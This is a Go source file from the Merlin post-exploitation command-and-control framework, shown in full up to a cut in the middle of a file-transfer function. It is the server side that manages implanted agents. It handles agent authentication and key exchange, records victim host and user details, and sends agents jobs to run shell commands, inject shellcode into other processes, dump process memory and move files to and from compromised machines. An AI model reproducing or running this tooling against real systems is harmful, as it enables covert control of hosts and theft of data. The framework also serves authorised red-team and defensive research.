// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agents

import (
	// Standard
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/cretz/gopaque/gopaque"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
	"github.com/satori/go.uuid"
	"go.dedis.ch/kyber"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/logging"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// Global Variables

// Agents contains all of the instantiated agent object that are accessed by other modules
var Agents = make(map[uuid.UUID]*agent)

type agent struct {
	ID               uuid.UUID
	Platform         string
	Architecture     string
	UserName         string
	UserGUID         string
	HostName         string
	Ips              []string
	Pid              int
	agentLog         *os.File
	channel          chan []Job
	InitialCheckIn   time.Time
	StatusCheckIn    time.Time
	Version          string
	Build            string
	WaitTime         string
	PaddingMax       int
	MaxRetry         int
	FailedCheckin    int
	Skew             int64
	Proto            string
	KillDate         int64
	RSAKeys          *rsa.PrivateKey                // RSA Private/Public key pair; Private key used to decrypt messages
	PublicKey        rsa.PublicKey                  // Public key used to encrypt messages
	secret           []byte                         // secret is used to perform symmetric encryption operations
	OPAQUEServerAuth gopaque.ServerAuth             // OPAQUE Server Authentication information used to derive shared secret
	OPAQUEServerReg  gopaque.ServerRegister         // OPAQUE server registration information
	OPAQUERecord     gopaque.ServerRegisterComplete // Holds the OPAQUE kU, EnvU, PrivS, PubU
}

// KeyExchange is used to exchange public keys between the server and agent
func KeyExchange(m messages.Base) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into agents.KeyExchange function")
	}

	serverKeyMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "KeyExchange",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// Make sure the agent has previously authenticated
	if !isAgent(m.ID) {
		return serverKeyMessage, fmt.Errorf("the agent does not exist")
	}

	logging.Server(fmt.Sprintf("Received new agent key exchange from %s", m.ID))

	ke := m.Payload.(messages.KeyExchange)

	if core.Debug {
		message("debug", fmt.Sprintf("Received new public key from %s:\r\n%v", m.ID, ke.PublicKey))
	}

	serverKeyMessage.ID = Agents[m.ID].ID
	Agents[m.ID].PublicKey = ke.PublicKey

	// Generate key pair
	privateKey, rsaErr := rsa.GenerateKey(rand.Reader, 4096)
	if rsaErr != nil {
		return serverKeyMessage, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", rsaErr.Error())
	}

	Agents[m.ID].RSAKeys = privateKey

	if core.Debug {
		message("debug", fmt.Sprintf("Server's Public Key: %v", Agents[m.ID].RSAKeys.PublicKey))
	}

	pk := messages.KeyExchange{
		PublicKey: Agents[m.ID].RSAKeys.PublicKey,
	}

	serverKeyMessage.ID = m.ID
	serverKeyMessage.Payload = pk

	if core.Debug {
		message("debug", "Leaving agents.KeyExchange returning without error")
		message("debug", fmt.Sprintf("serverKeyMessage: %v", serverKeyMessage))
	}
	return serverKeyMessage, nil
}

// OPAQUERegistrationInit is used to register an agent leveraging the OPAQUE Password Authenticated Key Exchange (PAKE) protocol
func OPAQUERegistrationInit(m messages.Base, opaqueServerKey kyber.Scalar) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into agents.OPAQUERegistrationInit function")
	}

	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "RegInit",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// Check to see if this agent is already known to the server
	if isAgent(m.ID) {
		return returnMessage, fmt.Errorf("the %s agent has already been registered", m.ID.String())
	}

	serverReg := gopaque.NewServerRegister(gopaque.CryptoDefault, opaqueServerKey)
	var userRegInit gopaque.UserRegisterInit

	errUserRegInit := userRegInit.FromBytes(gopaque.CryptoDefault, m.Payload.([]byte))
	if errUserRegInit != nil {
		return returnMessage, fmt.Errorf("there was an error unmarshalling the OPAQUE user register initialization message from bytes:\r\n%s", errUserRegInit.Error())
	}

	if !bytes.Equal(userRegInit.UserID, m.ID.Bytes()) {
		if core.Verbose {
			message("note", fmt.Sprintf("OPAQUE UserID: %v", userRegInit.UserID))
			message("note", fmt.Sprintf("Merlin Message UserID: %v", m.ID.Bytes()))
		}
		return returnMessage, errors.New("the OPAQUE UserID doesn't match the Merlin message ID")
	}

	serverRegInit := serverReg.Init(&userRegInit)

	serverRegInitBytes, errServerRegInitBytes := serverRegInit.ToBytes()
	if errServerRegInitBytes != nil {
		return returnMessage, fmt.Errorf("there was an error marshalling the OPAQUE server registration initialization message to bytes:\r\n%s", errServerRegInitBytes.Error())
	}

	returnMessage.Payload = serverRegInitBytes

	// Create new agent and add it to the global map
	agent, agentErr := newAgent(m.ID)
	if agentErr != nil {
		return returnMessage, fmt.Errorf("there was an error creating a new agent instance for %s:\r\n%s", m.ID.String(), agentErr.Error())
	}
	agent.OPAQUEServerReg = *serverReg

	// Add agent to global map
	Agents[m.ID] = &agent

	Log(m.ID, "Received agent OPAQUE register initialization message")

	if core.Debug {
		message("debug", "Leaving agents.OPAQUERegistrationInit function without error")
	}

	return returnMessage, nil
}

// OPAQUERegistrationComplete is used to complete OPAQUE user registration and store the encrypted envelope EnvU
func OPAQUERegistrationComplete(m messages.Base) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into agents.OPAQUERegistrationComplete function")
	}

	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "RegComplete",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// check to see if this agent is already known to the server
	if !isAgent(m.ID) {
		return returnMessage, fmt.Errorf("the %s agent has not completed OPAQUE user registration intialization", m.ID.String())
	}

	var userRegComplete gopaque.UserRegisterComplete

	errUserRegComplete := userRegComplete.FromBytes(gopaque.CryptoDefault, m.Payload.([]byte))
	if errUserRegComplete != nil {
		return returnMessage, fmt.Errorf("there was an error unmarshalling the OPAQUE user register complete message from bytes:\r\n%s", errUserRegComplete.Error())
	}

	Agents[m.ID].OPAQUERecord = *Agents[m.ID].OPAQUEServerReg.Complete(&userRegComplete)

	// Check to make sure Merlin  UserID matches OPAQUE UserID
	if !bytes.Equal(m.ID.Bytes(), Agents[m.ID].OPAQUERecord.UserID) {
		return returnMessage, fmt.Errorf("the OPAQUE UserID: %v doesn't match the Merlin UserID: %v", Agents[m.ID].OPAQUERecord.UserID, m.ID.Bytes())
	}

	Log(m.ID, "OPAQUE registration complete")

	if core.Debug {
		message("debug", "Leaving agents.OPAQUERegistrationComplete function without error")
	}

	return returnMessage, nil
}

// OPAQUEAuthenticateInit is used to authenticate an agent leveraging the OPAQUE Password Authenticated Key Exchange (PAKE) protocol and pre-shared key
func OPAQUEAuthenticateInit(m messages.Base) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into agents.OPAQUEAuthenticateInit function")
	}

	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "AuthInit",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// Check to see if this agent is already known to the server
	if !isAgent(m.ID) {
		return returnMessage, fmt.Errorf("the %s agent has not OPAQUE registered", m.ID.String())
	}

	// 1 - Receive the user's UserAuthInit
	serverKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
	serverAuth := gopaque.NewServerAuth(gopaque.CryptoDefault, serverKex)
	Agents[m.ID].OPAQUEServerAuth = *serverAuth

	var userInit gopaque.UserAuthInit
	errFromBytes := userInit.FromBytes(gopaque.CryptoDefault, m.Payload.([]byte))
	if errFromBytes != nil {
		message("warn", fmt.Sprintf("there was an error unmarshalling the user init message from bytes:\r\n%s", errFromBytes.Error()))
	}

	serverAuthComplete, errServerAuthComplete := serverAuth.Complete(&userInit, &Agents[m.ID].OPAQUERecord)

	if errServerAuthComplete != nil {
		return returnMessage, fmt.Errorf("there was an error completing the OPAQUE server authentication:\r\n%s", errServerAuthComplete.Error())
	}

	if core.Debug {
		message("debug", fmt.Sprintf("User Auth Init:\r\n%+v", userInit))
		message("debug", fmt.Sprintf("Server Auth Complete:\r\n%+v", serverAuthComplete))
	}

	serverAuthCompleteBytes, errServerAuthCompleteBytes := serverAuthComplete.ToBytes()
	if errServerAuthCompleteBytes != nil {
		return returnMessage, fmt.Errorf("there was an error marshalling the OPAQUE server authentication complete message to bytes:\r\n%s", errServerAuthCompleteBytes.Error())
	}

	returnMessage.Payload = serverAuthCompleteBytes
	Agents[m.ID].secret = []byte(serverKex.SharedSecret.String())

	Log(m.ID, "Received new agent OPAQUE authentication initialization message")

	if core.Debug {
		message("debug", fmt.Sprintf("Received new agent OPAQUE authentication for %s at %s", m.ID, time.Now().UTC().Format(time.RFC3339)))
		message("debug", "Leaving agents.OPAQUEAuthenticateInit function without error")
		message("debug", fmt.Sprintf("Server OPAQUE key exchange shared secret: %v", Agents[m.ID].secret))
	}
	return returnMessage, nil
}

// OPAQUEAuthenticateComplete is used to receive the OPAQUE UserAuthComplete
func OPAQUEAuthenticateComplete(m messages.Base) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into agents.OPAQUEAuthenticateComplete function")
	}

	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "ServerOk",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// check to see if this agent is already known to the server
	if !isAgent(m.ID) {
		return returnMessage, fmt.Errorf("%s is not a known agent", m.ID.String())
	}

	Log(m.ID, "Received agent OPAQUE authentication complete message")

	var userComplete gopaque.UserAuthComplete
	errFromBytes := userComplete.FromBytes(gopaque.CryptoDefault, m.Payload.([]byte))
	if errFromBytes != nil {
		message("warn", fmt.Sprintf("there was an error unmarshalling the user complete message from bytes:\r\n%s", errFromBytes.Error()))
	}

	// server auth finish
	errAuthFinish := Agents[m.ID].OPAQUEServerAuth.Finish(&userComplete)
	if errAuthFinish != nil {
		message("warn", fmt.Sprintf("there was an error finishing authentication:\r\n%s", errAuthFinish.Error()))
	}

	message("success", fmt.Sprintf("New authenticated agent checkin for %s at %s", m.ID.String(), time.Now().UTC().Format(time.RFC3339)))
	if core.Debug {
		message("debug", "Leaving agents.OPAQUEAuthenticateComplete function without error")
	}
	return returnMessage, nil
}

// OPAQUEReAuthenticate is used when an agent has previously completed OPAQUE registration but needs to re-authenticate
func OPAQUEReAuthenticate(agentID uuid.UUID) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into agents.OPAQUEReAuthenticate function")
	}

	returnMessage := messages.Base{
		ID:      agentID,
		Version: 1.0,
		Type:    "ReAuthenticate",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// Check to see if this agent is already known to the server
	if !isAgent(agentID) {
		return returnMessage, fmt.Errorf("the %s agent has not OPAQUE registered", agentID.String())
	}

	if core.Debug {
		message("debug", "Leaving agents.OPAQUEReAuthenticate function without error")
	}
	Log(agentID, "Instructing agent to re-authenticate with OPAQUE protocol")

	return returnMessage, nil
}

// GetEncryptionKey retrieves the per-agent payload encryption key used to decrypt messages for any protocol
func GetEncryptionKey(agentID uuid.UUID) []byte {
	if core.Debug {
		message("debug", "Entering into agents.GetEncryptionKey function")
	}
	var key []byte

	if isAgent(agentID) {
		key = Agents[agentID].secret
	}

	if core.Debug {
		message("debug", "Leaving agents.GetEncryptionKey function")
	}
	return key
}

// StatusCheckIn is the function that is run when an agent sends a message back to server, checking in for additional instructions
func StatusCheckIn(m messages.Base) (messages.Base, error) {
	// Check to make sure agent UUID is in dataset
	_, ok := Agents[m.ID]
	if !ok {
		message("warn", fmt.Sprintf("Orphaned agent %s has checked in at %s. Instructing agent to re-initialize...",
			time.Now().UTC().Format(time.RFC3339), m.ID.String()))
		logging.Server(fmt.Sprintf("[Orphaned agent %s has checked in", m.ID.String()))
		job := Job{
			ID:      core.RandStringBytesMaskImprSrc(10),
			Type:    "initialize",
			Created: time.Now(),
			Status:  "created",
		}
		m, mErr := GetMessageForJob(m.ID, job)
		return m, mErr
	}

	Log(m.ID, "Agent status check in")
	if core.Verbose {
		message("success", fmt.Sprintf("Received agent status checkin from %s", m.ID))
	}
	if core.Debug {
		message("debug", fmt.Sprintf("Received agent status checkin from %s", m.ID))
		message("debug", fmt.Sprintf("Channel length: %d", len(Agents[m.ID].channel)))
		message("debug", fmt.Sprintf("Channel content: %v", Agents[m.ID].channel))
	}

	Agents[m.ID].StatusCheckIn = time.Now().UTC()
	// Check to see if there are any jobs
	if len(Agents[m.ID].channel) >= 1 {
		job := <-Agents[m.ID].channel
		if core.Debug {
			message("debug", fmt.Sprintf("Channel command string: %s", job))
			message("debug", fmt.Sprintf("Agent command type: %s", job[0].Type))
		}

		m, mErr := GetMessageForJob(m.ID, job[0])
		return m, mErr
	}
	returnMessage := messages.Base{
		Version: 1.0,
		ID:      m.ID,
		Type:    "ServerOk",
		Padding: core.RandStringBytesMaskImprSrc(Agents[m.ID].PaddingMax),
	}
	return returnMessage, nil
}

// UpdateInfo is used to update an agent's information with the passed in message data
func UpdateInfo(m messages.Base) error {
	if core.Debug {
		message("debug", "Entering into agents.UpdateInfo function")
	}

	p := m.Payload.(messages.AgentInfo)

	if !isAgent(m.ID) {
		message("warn", "The agent was not found while processing an AgentInfo message")
		return fmt.Errorf("%s is not a known agent", m.ID)
	}
	if core.Debug {
		message("debug", "Processing new agent info")
		message("debug", fmt.Sprintf("Agent Version: %s", p.Version))
		message("debug", fmt.Sprintf("Agent Build: %s", p.Build))
		message("debug", fmt.Sprintf("Agent waitTime: %s", p.WaitTime))
		message("debug", fmt.Sprintf("Agent skew: %d", p.Skew))
		message("debug", fmt.Sprintf("Agent paddingMax: %d", p.PaddingMax))
		message("debug", fmt.Sprintf("Agent maxRetry: %d", p.MaxRetry))
		message("debug", fmt.Sprintf("Agent failedCheckin: %d", p.FailedCheckin))
		message("debug", fmt.Sprintf("Agent proto: %s", p.Proto))
		message("debug", fmt.Sprintf("Agent killdate: %s", time.Unix(p.KillDate, 0).UTC().Format(time.RFC3339)))
	}
	Log(m.ID, fmt.Sprintf("Processing AgentInfo message:"))
	Log(m.ID, fmt.Sprintf("\tAgent Version: %s ", p.Version))
	Log(m.ID, fmt.Sprintf("\tAgent Build: %s ", p.Build))
	Log(m.ID, fmt.Sprintf("\tAgent waitTime: %s ", p.WaitTime))
	Log(m.ID, fmt.Sprintf("\tAgent skew: %d ", p.Skew))
	Log(m.ID, fmt.Sprintf("\tAgent paddingMax: %d ", p.PaddingMax))
	Log(m.ID, fmt.Sprintf("\tAgent maxRetry: %d ", p.MaxRetry))
	Log(m.ID, fmt.Sprintf("\tAgent failedCheckin: %d ", p.FailedCheckin))
	Log(m.ID, fmt.Sprintf("\tAgent proto: %s ", p.Proto))
	Log(m.ID, fmt.Sprintf("\tAgent KillDate: %s", time.Unix(p.KillDate, 0).UTC().Format(time.RFC3339)))

	Agents[m.ID].Version = p.Version
	Agents[m.ID].Build = p.Build
	Agents[m.ID].WaitTime = p.WaitTime
	Agents[m.ID].Skew = p.Skew
	Agents[m.ID].PaddingMax = p.PaddingMax
	Agents[m.ID].MaxRetry = p.MaxRetry
	Agents[m.ID].FailedCheckin = p.FailedCheckin
	Agents[m.ID].Proto = p.Proto
	Agents[m.ID].KillDate = p.KillDate

	Agents[m.ID].Architecture = p.SysInfo.Architecture
	Agents[m.ID].HostName = p.SysInfo.HostName
	Agents[m.ID].Pid = p.SysInfo.Pid
	Agents[m.ID].Ips = p.SysInfo.Ips
	Agents[m.ID].Platform = p.SysInfo.Platform
	Agents[m.ID].UserName = p.SysInfo.UserName
	Agents[m.ID].UserGUID = p.SysInfo.UserGUID

	if core.Debug {
		message("debug", "Leaving agents.UpdateInfo function")
	}
	return nil
}

// Log is used to write log messages to the agent's log file
func Log(agentID uuid.UUID, logMessage string) {
	if core.Debug {
		message("debug", "Entering into agents.Log")
	}
	_, err := Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]%s\r\n", time.Now().UTC().Format(time.RFC3339), logMessage))
	if err != nil {
		message("warn", fmt.Sprintf("There was an error writing to the agent log agents.Log:\r\n%s", err.Error()))
	}
}

// GetAgentList returns a list of agents that exist and is used for command line tab completion
func GetAgentList() func(string) []string {
	return func(line string) []string {
		a := make([]string, 0)
		for k := range Agents {
			a = append(a, k.String())
		}
		return a
	}
}

// ShowInfo lists all of the agent's structure value in a table
func ShowInfo(agentID uuid.UUID) {

	if !isAgent(agentID) {
		message("warn", fmt.Sprintf("%s is not a valid agent!", agentID))
		return
	}

	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)

	data := [][]string{
		{"Status", GetAgentStatus(agentID)},
		{"ID", Agents[agentID].ID.String()},
		{"Platform", Agents[agentID].Platform},
		{"Architecture", Agents[agentID].Architecture},
		{"UserName", Agents[agentID].UserName},
		{"User GUID", Agents[agentID].UserGUID},
		{"Hostname", Agents[agentID].HostName},
		{"Process ID", strconv.Itoa(Agents[agentID].Pid)},
		{"IP", fmt.Sprintf("%v", Agents[agentID].Ips)},
		{"Initial Check In", Agents[agentID].InitialCheckIn.Format(time.RFC3339)},
		{"Last Check In", Agents[agentID].StatusCheckIn.Format(time.RFC3339)},
		{"Agent Version", Agents[agentID].Version},
		{"Agent Build", Agents[agentID].Build},
		{"Agent Wait Time", Agents[agentID].WaitTime},
		{"Agent Wait Time Skew", strconv.FormatInt(Agents[agentID].Skew, 10)},
		{"Agent Message Padding Max", strconv.Itoa(Agents[agentID].PaddingMax)},
		{"Agent Max Retries", strconv.Itoa(Agents[agentID].MaxRetry)},
		{"Agent Failed Check In", strconv.Itoa(Agents[agentID].FailedCheckin)},
		{"Agent Kill Date", time.Unix(Agents[agentID].KillDate, 0).UTC().Format(time.RFC3339)},
		{"Agent Communication Protocol", Agents[agentID].Proto},
	}
	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
}

// message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// AddJob creates a job and adds it to the specified agent's channel and returns the Job ID or an error
func AddJob(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
	// TODO turn this into a method of the agent struct
	if core.Debug {
		message("debug", fmt.Sprintf("In agents.AddJob function for agent: %s", agentID.String()))
		message("debug", fmt.Sprintf("In agents.AddJob function for type: %s", jobType))
		message("debug", fmt.Sprintf("In agents.AddJob function for command: %s", jobArgs))
	}

	if isAgent(agentID) || agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
		job := Job{
			Type:    jobType,
			Status:  "created",
			Args:    jobArgs,
			Created: time.Now().UTC(),
		}

		if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
			if len(Agents) <= 0 {
				return "", errors.New("there are 0 available agents, no jobs were created")
			}
			for k := range Agents {
				s := Agents[k].channel
				job.ID = core.RandStringBytesMaskImprSrc(10)
				s <- []Job{job}
				Log(k, fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Args:%s",
					job.Type,
					job.ID,
					job.Status,
					job.Args))
			}
			return job.ID, nil
		}
		job.ID = core.RandStringBytesMaskImprSrc(10)
		s := Agents[agentID].channel
		s <- []Job{job}
		Log(agentID, fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Args:%s",
			job.Type,
			job.ID,
			job.Status,
			job.Args))
		return job.ID, nil
	}
	return "", errors.New("invalid agent ID")
}

// GetMessageForJob returns a Message Base structure for the provided job type
func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
	m := messages.Base{
		Version: 1.0,
		ID:      agentID,
	}
	if !isAgent(agentID) {
		return m, fmt.Errorf("%s is not a valid agent", agentID.String())
	}
	m.Padding = core.RandStringBytesMaskImprSrc(Agents[agentID].PaddingMax)
	switch job.Type {
	case "cmd":
		m.Type = "CmdPayload"
		p := messages.CmdPayload{
			Command: job.Args[0],
			Job:     job.ID,
		}
		if len(job.Args) > 1 {
			p.Args = strings.Join(job.Args[1:], " ")
		}
		m.Payload = p
	case "shellcode":
		m.Type = "Shellcode"
		p := messages.Shellcode{
			Method: job.Args[0],
			Job:    job.ID,
		}

		if p.Method == "self" {
			p.Bytes = job.Args[1]
		} else if p.Method == "remote" || p.Method == "rtlcreateuserthread" || p.Method == "userapc" {
			i, err := strconv.Atoi(job.Args[1])
			if err != nil {
				return m, err
			}
			p.PID = uint32(i)
			p.Bytes = job.Args[2]
		}
		m.Payload = p
	case "download":
		m.Type = "FileTransfer"
		Log(agentID, fmt.Sprintf("Downloading file from agent at %s\n", job.Args[0]))

		p := messages.FileTransfer{
			FileLocation: job.Args[0],
			Job:          job.ID,
			IsDownload:   false,
		}
		m.Payload = p
	case "initialize":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Type,
			Job:     job.ID,
		}
		m.Payload = p
	case "kill":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}
		m.Payload = p
	case "ls":
		m.Type = "NativeCmd"
		p := messages.NativeCmd{
			Job:     job.ID,
			Command: job.Args[0],
		}

		if len(job.Args) > 1 {
			p.Args = job.Args[1]
		} else {
			p.Args = "./"
		}
		m.Payload = p
	case "killdate":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}
		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		m.Payload = p
	case "cd":
		m.Type = "NativeCmd"
		p := messages.NativeCmd{
			Job:     job.ID,
			Command: job.Args[0],
			Args:    strings.Join(job.Args[1:], " "),
		}
		m.Payload = p
	case "pwd":
		m.Type = "NativeCmd"
		p := messages.NativeCmd{
			Job:     job.ID,
			Command: job.Args[0],
			Args:    "",
		}
		m.Payload = p
	case "maxretry":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		m.Payload = p
	case "padding":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		m.Payload = p
	case "skew":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		m.Payload = p
	case "sleep":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		m.Payload = p
	case "Minidump":
		m.Type = "Module"
		p := messages.Module{
			Command: job.Type,
			Job:     job.ID,
			Args:    job.Args,
		}
		m.Payload = p
	case "upload":
		m.Type = "FileTransfer"
		// TODO add error handling; check 2 args (src, dst)
		uploadFile, uploadFileErr := ioutil.ReadFile(job.Args[0])
		if uploadFileErr != nil {
			// TODO send "ServerOK"
			return m, fmt.Errorf("there was an error reading %s: %v", job.Type, uploadFileErr)
		}
		fileHash := sha256.New()
		_, err := io.WriteString(fileHash, string(uploadFile))
		if err != nil {
			message("warn", fmt.Sprintf("There was an error generating file hash:\r\n%s", err.Error()))
		}
		Log(agentID, fmt.Sprintf("Uploading file from server at %s of size %d bytes and SHA-256: %x to agent at %s",
			job.Args[0],
			len(uploadFile),
			fileHash.Sum(nil),
			job.Args[1]))

		p := messages.FileTransfer{
			FileLocation: job.Args[1],
			FileBlob:     base64.StdEncoding.EncodeToString([]byte(uploadFile)),
			IsDownload:   true, // The agent will be downloading the file provided by the server in the FileBlob field
			Job:          job.ID,
		}
		m.Payload = p
	default:
		m.Type = "ServerOk"
		return m, errors.New("invalid job type, sending ServerOK")
	}
	return m, nil
}

// GetAgentStatus evaluates the agent's last check in time and max wait time to determine if it is active, delayed, or dead
func GetAgentStatus(agentID uuid.UUID) string {
	var status string
	if !isAgent(agentID) {
		return fmt.Sprintf("%s is not a valid agent", agentID.String())
	}
	dur, errDur := time.ParseDuration(Agents[agentID].WaitTime)
	if errDur != nil {
		message("warn", fmt.Sprintf("Error converting %s to a time duration: %s", Agents[agentID].WaitTime,
			errDur.Error()))
	}
	if Agents[agentID].StatusCheckIn.Add(dur).After(time.Now()) {
		status = "Active"
	} else if Agents[agentID].StatusCheckIn.Add(dur * time.Duration(Agents[agentID].MaxRetry+1)).After(time.Now()) { // +1 to account for skew
		status = "Delayed"
	} else {
		status = "Dead"
	}
	return status
}

// RemoveAgent deletes the agent object from Agents map by its ID
func RemoveAgent(agentID uuid.UUID) error {
	if isAgent(agentID) {
		delete(Agents, agentID)
		return nil
	}
	return fmt.Errorf("%s is not a known agent and was not removed", agentID.String())

}

// GetAgentFieldValue returns a string value for the field value belonging to the specified Agent
func GetAgentFieldValue(agentID uuid.UUID, field string) (string, error) {
	if isAgent(agentID) {
		switch strings.ToLower(field) {
		case "platform":
			return Agents[agentID].Platform, nil
		case "architecture":
			return Agents[agentID].Architecture, nil
		case "username":
			return Agents[agentID].UserName, nil
		case "waittime":
			return Agents[agentID].WaitTime, nil
		}
		return "", fmt.Errorf("the provided agent field could not be found: %s", field)
	}
	return "", fmt.Errorf("%s is not a valid agent", agentID.String())
}

// isAgent enumerates a map of all instantiated agents and returns true if the provided agent UUID exists
func isAgent(agentID uuid.UUID) bool {
	for agent := range Agents {
		if Agents[agent].ID == agentID {
			return true
		}
	}
	return false
}

// newAgent creates a new Agent and returns the object but does not add it to the global agents map
func newAgent(agentID uuid.UUID) (agent, error) {
	if core.Debug {
		message("debug", "Entering into agents.newAgent function")
	}
	var agent agent
	if isAgent(agentID) {
		return agent, fmt.Errorf("the %s agent already exists", agentID)
	}

	agentsDir := filepath.Join(core.CurrentDir, "data", "agents")

	// Create a directory for the new agent's files
	if _, err := os.Stat(filepath.Join(agentsDir, agentID.String())); os.IsNotExist(err) {
		errM := os.MkdirAll(filepath.Join(agentsDir, agentID.String()), 0750)
		if errM != nil {
			return agent, fmt.Errorf("there was an error creating a directory for agent %s:\r\n%s",
				agentID.String(), err.Error())
		}
		// Create the agent's log file
		agentLog, errC := os.Create(filepath.Join(agentsDir, agentID.String(), "agent_log.txt"))
		if errC != nil {
			return agent, fmt.Errorf("there was an error creating the agent_log.txt file for agnet %s:\r\n%s",
				agentID.String(), err.Error())
		}

		// Change the file's permissions
		errChmod := agentLog.Chmod(0640)
		if errChmod != nil {
			return agent, fmt.Errorf("there was an error changing the file permissions for the agent log:\r\n%s", errChmod.Error())
		}

		if core.Verbose {
			message("note", fmt.Sprintf("Created agent log file at: %s agent_log.txt",
				path.Join(agentsDir, agentID.String())))
		}
	}
	// Open agent's log file for writing
	f, err := os.OpenFile(filepath.Join(agentsDir, agentID.String(), "agent_log.txt"), os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return agent, fmt.Errorf("there was an error openeing the %s agent's log file:\r\n%s", agentID.String(), err.Error())
	}

	agent.ID = agentID
	agent.agentLog = f
	agent.InitialCheckIn = time.Now().UTC()
	agent.StatusCheckIn = time.Now().UTC()
	agent.channel = make(chan []Job, 10)

	_, errAgentLog := agent.agentLog.WriteString(fmt.Sprintf("[%s]%s\r\n", time.Now().UTC().Format(time.RFC3339), "Instantiated agent"))
	if errAgentLog != nil {
		message("warn", fmt.Sprintf("There was an error writing to the agent log agents.Log:\r\n%s", errAgentLog.Error()))
	}

	if core.Debug {
		message("debug", "Leaving agents.newAgent function without error")
	}
	return agent, nil
}

// JobResults handles the response message sent by the agent
func JobResults(m messages.Base) error {
	if core.Debug {
		message("debug", "Entering into agents.JobResults")
	}

	// Check to make sure it is a known agent
	if !isAgent(m.ID) {
		return fmt.Errorf("%s is not a known agent", m.ID)
	}

	// Check to make sure it was a real job for that agent

	p := m.Payload.(messages.CmdResults)
	Log(m.ID, fmt.Sprintf("Results for job: %s", p.Job))

	fmt.Println()
	message("success", fmt.Sprintf("Results for job %s at %s", p.Job, time.Now().UTC().Format(time.RFC3339)))
	fmt.Println()
	if len(p.Stdout) > 0 {
		Log(m.ID, fmt.Sprintf("Command Results (stdout):\r\n%s", p.Stdout))
		color.Green(p.Stdout)
	}
	if len(p.Stderr) > 0 {
		Log(m.ID, fmt.Sprintf("Command Results (stderr):\r\n%s", p.Stderr))
		color.Red(p.Stderr)
	}

	if core.Debug {
		message("debug", "Leaving agents.JobResults")
	}
	fmt.Println()
	return nil
}

// FileTransfer handles file upload/download operations
func FileTransfer(m messages.Base) error {
	if core.Debug {
		message("debug", "Entering into agents.FileTransfer")
	}

	// Check to make sure it is a known agent
	if !isAgent(m.ID) {
		return fmt.Errorf("%s is not a known agent", m.ID)
	}

	p := m.Payload.(messages.FileTransfer)

	if p.IsDownload {
		agentsDir := filepath.Join(core.CurrentDir, "data", "agents")
		_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
		if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
			errorMessage := fmt.Errorf("there was an error locating the agent's directory:\r\n%s", errD.Error())
